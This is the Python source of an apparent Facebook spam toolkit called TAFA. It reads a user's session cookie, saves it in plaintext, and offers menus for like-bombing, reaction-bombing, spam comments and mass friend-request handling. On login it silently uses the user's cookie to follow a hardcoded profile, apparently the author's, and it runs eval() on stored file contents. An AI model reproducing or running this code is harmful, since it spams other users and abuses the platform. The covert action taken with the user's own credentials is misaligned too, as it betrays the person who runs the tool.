#Warna
W = '\033[1;37m' #Putih
N = '\033[0m' # Tutup
R = '\033[1;37m\033[31m'  #Merah
G = '\033[1;32m' #Ijo
B = '\033[1;37m\033[34m' # biru
O = '\033[33m' # Kuning
C = '\033[36m' #Biru laut
K = '\x1b[1;93m' #Kuning

notic  = "{}{}[*]{} ".format(N,B,N)
warning = "{}[-]{} ".format(R,N)
good    = "{}[!]{} ".format(G,N)
warn    = "{}[!]{} ".format(O,N)
exi = "{}[{}!{}] ".format(W,R,W)
inp = '\n   >>> '
def logo(t=False, n=False):
	a = ("""%s
  _________    _________ 
 /_  __/   |  / ____/   |
  / / / /| | / /_  / /| |
 / / / ___ |/ __/ / ___ |
/_/ /_/  |_/_/   /_/  |_| %sv0.3 Beta%s
                         
""" % (W,K,W)).splitlines()
	angka = 0
	for s in a:
		print("\t" + s)
	if t:
		supported = ["\t[*] Supported: Uzang     [*]", "\t[*] Supported: TyoMP     [*]", "\t[*] Supported: Mr-Xsz    [*]"]
		print("\t[*] Toolkit For Facebook [*]")
		print("\t[*] Author: SalisM3      [*]")
		print(random.choice(supported))
	elif n:
		nama = eval(open('kuki.txt').read())['nama'][:20]
		spasi = (22 - len(nama) - 1) // 2
		spasi = spasi * " "
		print("\t[*] " + spasi + nama + spasi + " [*]\n")
		
def echo(teks):
	print("   " + teks)
	
def follow_aing(kuki):
	try:
		data = parser(r.get('', headers={'cookie':kuki}).text, 'html.parser').find('a', string='Ikuti').get('href')
		data = str(data)
		r.get('https://mbasic.facebook.com/profile.php?id=100041106940465', data, headers={'cookie':kuki})
	except:
		pass

def enter():
	click('\n   %s[ %sPress Enter To Back %s]' % (W,K,W))
	os.system('python TAFA.py')
	exit()
	
def wrong_id(id,p=False,g=False,f=False,h=False):
	gas = Core()
	if p:
		cek = gas.cek_id(id,p=True)
	elif g:
		cek = gas.cek_id(id,p=True)
	elif f:
		cek = gas.cek_id(id,f=True)
	elif h:
		cek = gas.cek_id(id,h=True)
		
	if cek:
		return True
	else:
		return False
		

##### class #####
class Menu:
	def __init__(self):
		pass
		
	def m1(self):
		os.system('xdg-open https://www.youtube.com/channel/UCLU9H65QrIC6u2UetU6476w')
		time.sleep(3)
		print()
		echo("%s1%s). Go To Menu" % (G,W))
		echo("%s2%s). Login" % (G,W))
		echo("%s3%s). Logout" % (G,W))
		echo("%s4%s). Info Tools" % (G,W))
		echo("%s0%s). Exit" % (R,W))
		pilih = int(input(inp))
		login = Login()
		if pilih == 0:
			echo("%s[%s!%s] Exit: Ok" % (W,R,W))
			os.system('xdg-open https://www.youtube.com/channel/UCLU9H65QrIC6u2UetU6476w')
			time.sleep(3)
		elif pilih == 1:
			if not cek_login():
				echo("[!] Please Login")
				time.sleep(1)
				home()
			else:
				self.m2()
		elif pilih == 2:
			login.in_()
		elif pilih == 3:
			login.out()
		elif pilih == 4:
			print()
			echo("%s[%s~%s] Find Me On : " % (W,G,W))
			echo("[%s+%s] Author %s: %sSalisM3 | Angga " % (G,W,G,W))
			echo("[%s+%s] Facebook %s: %sSalis Mazaya" % (G,W,G,W))
			echo("[%s+%s] Email %s: %ssalismazaya@gmail.com" % (G,W,G,W))
			echo("[%s+%s] Telegram %s: %s@salismiftah" % (G,W,G,W))
			echo("[%s+%s] YouTube %s: %sScript Termux" % (G,W,G,W))
			echo("[%s+%s] InstaGram %s: %s 4N9GA" % (G,W,G,W))
			echo("[%s~%s] Date Release %s: %s 25/10/2019" % (G,W,G,W))
			
			enter()
		else:
			home()
			
	def m2(self): # home menu
		os.system('clear')
		logo(n=True)
		echo("%s1%s). Like" % (G,W))
		echo("%s2%s). React" % (G,W))
		echo("%s3%s). Comment" % (G,W))
		echo("%s4%s). Group" % (G,W))
		echo("%s5%s). Friend" % (G,W))
		echo("%s0%s). Back" % (R,W))
		pilih = int(input(inp))
		if pilih == 0:
			home()
		elif pilih == 1:
			self.m3()
		elif pilih == 2:
			self.m5()
		elif pilih == 3:
			self.m6()
		elif pilih == 4:
			print()
			echo("[!] Cooming Soon")
			enter()
		elif pilih == 5:
			self.m4()
		else:
			self.m2()
	
	def m3(self): # like menu
		os.system('clear')
		logo(n=True)
		echo("%s1%s). Bom Like Friend Timeline" % (G,W))
		echo("%s2%s). Bom Like in Group" % (G,W))
		echo("%s3%s). Bom Like in Fanspage" % (G,W))
		echo("%s4%s). Bom Like in Home" % (G,W))
		echo("%s0%s). Back" % (R,W))
		pilih = int(input(inp))
		if pilih == 1:
			bom_like_friend()
		elif pilih == 2:
			bom_like_grup()
		elif pilih == 3:
			bom_like_halaman()
		elif pilih == 4:
			bom_like_home()
		elif pilih == 0:
			self.m2()
		else:
			self.m3()
	
	def m4(self): # other menu
		os.system('clear')
		logo(n=True)
		echo("%s1%s). Acc All Friend Requests" % (G,W))
		echo("%s2%s). Reject All Friend Requests" % (G,W))
		echo("%s3%s). Unadd (not Unfriend)" % (G,W))
		echo("%s0%s). Back" % (R,W))
		pilih = int(input(inp))
		if pilih == 0:
			self.m2()
		elif pilih == 1:
			acc_all_friend()
		elif pilih == 2:
			rej_all_friend()
		elif pilih == 3:
			unadd_all_friend()
		else:
			self.m4()
	
	def m5(self): #react menu
		os.system('clear')
		logo(n=True)
		echo("%s1%s). Bom React Friend Timeline" % (G,W))
		echo("%s0%s). Back" % (R,W))
		pilih = int(input(inp))
		if pilih == 0:
			self.m2()
		elif pilih == 1:
			bom_react_friend()
		else:
			self.m5()
		
	def m6(self): #komen menu
		os.system('clear')
		logo(n=True)
		echo("%s1%s). Spam Comment Friend Timeline" % (G,W))
		echo("%s2%s). Spam Comment in Group" % (G,W))
		echo("%s3%s). Spam Comment in Fanspage" % (G,W))
		echo("%s4%s). Spam Comment in Home" % (G,W))
		echo("%s0%s). Back" % (R,W))
		pilih = int(input(inp))
		if pilih == 0:
			self.m2()
		elif pilih == 1:
			spam_komen_friend()
		elif pilih == 2:
			spam_komen_grup()
		elif pilih == 3:
			spam_komen_halaman()
		elif pilih == 4:
			spam_komen_home()
		else:
			self.m6()
		
		
class Login():
	def __init__(self):
		pass
	
	def in_(self):
		if cek_login():
			echo("%s[%s+%s] You Has Been Login" % (W,G,W))
			time.sleep(1)
			home()
		else:
			os.system('clear')
			echo("%s[ %sEnter Your Facebook Cookies %s]\n" % (W,C,W))
			kuki = str(input("   %s[%s?%s] Your Cookies: " % (W,R,W)))
			if cek_login(c=True, kuki=kuki):
				if not "id_ID" in kuki:
					print()
					echo("%s[%s!%s] Use Indonesian Language When Generating Cookies" % (W,R,W))
					enter()
				open('kuki.txt', 'w').write("{'kuki':'" + kuki + "'}")
				kuki = eval(open('kuki.txt').read())['kuki']
				follow_aing(kuki)
				info = Information()
				nama = info.get_name_myself()
				echo("%s[%s!%s] Login Success" % (W,R,W))
				time.sleep(0.5)
				open('kuki.txt', 'w').write("{'nama':'" + nama + "', 'kuki':'" + kuki + "'}")
				echo("%s[%s!%s] Your Cookies Saved in: kuki.txt" % (W,R,W))
				time.sleep(1)
				home()
			else:
				echo("%s[%s!%s] Invalid Cookies" % (W,R,W))
				time.sleep(1)
				home()
	
	def out(self):
		pilih = str(input('\n   %s[%s?%s] type "%syes%s" to confirm: ' % (W,R,W,G,W)))
		if pilih == "yes":
			try:
				os.remove('kuki.txt')
				echo("%s[%s!%s] Logout: Ok" % (W,R,W))
			except:
				echo("%s[%s!%s] Logout: Failed" % (W,R,W))
			time.sleep(1)
			home()
		else:
			echo("%s[%s!%s] Operation Cancelled" % (W,R,W))
			time.sleep(1)
			home()
##### class #####

def update_kuki():
	while True:
		kuki = str(input('\n   [!] your proses has been stoped because your\n       cookies expired to continue please update it\n       or type "exit" to exit : '))
		if kuki == "exit":
			raise KeyboardInterrupt
		elif cek_login(c=True, kuki=kuki):
			echo("\n[+] Continue Process")
			return kuki
			break
		
def cek_kuki():
	if not cek_login():
		exit("%s[%s!%s] Kuki Expired" % (W,R,W))
		
def cek_login(c=False, kuki=""):
	try:
		if not c:
			kuki = eval(open('kuki.txt').read())['kuki']
		cek = r.get('https://mbasic.facebook.com', headers={'cookie':kuki}).text
		if "mbasic_logout_button" in cek:
			return True
		else:
			return False
	except r.exceptions.ConnectionError:
		exit("%s[%s!%s] Signal Error" % (W,R,W))
	except:
		return False			

def home():
	os.system('clear')
	logo(t=True)
	menu = Menu()
	menu.m1()
	
try:
	##### menu #####
	exec(open('menu/like.py').read())
	exec(open('menu/friend.py').read())
	exec(open('menu/react.py').read())
	exec(open('menu/komen.py').read())
	##### menu #####
	import random, time, mechanize, os, requests as r
	from bs4 import BeautifulSoup as parser
	from getpass import getpass as click
	exec(open('module.py').read())
	home()
except r.exceptions.ConnectionError:
	echo("%s Signal Error" % (exi))
except ValueError:
	print()
	echo("%s Wrong Input / Process Force Stopped" % (exi))
	enter()
except KeyboardInterrupt:
	echo("%s[%s!%s] Exit: Ok" % (W,R,W))
except ImportError as e:
	echo("[!] " + str(e))
except Exception as e:
	echo("[!] " + str(e))